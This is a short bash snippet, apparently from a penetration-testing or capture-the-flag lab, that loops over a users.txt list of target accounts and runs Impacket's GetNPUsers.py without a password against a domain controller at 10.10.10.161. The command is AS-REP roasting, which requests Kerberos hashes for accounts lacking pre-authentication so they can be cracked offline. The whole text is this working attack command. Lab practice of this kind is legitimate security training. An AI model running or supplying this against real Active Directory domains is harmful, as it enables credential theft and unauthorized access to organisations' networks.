#create a users.txt file for targets
#!/bin/bash
for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 domain/${user} | grep -v Impacket; done
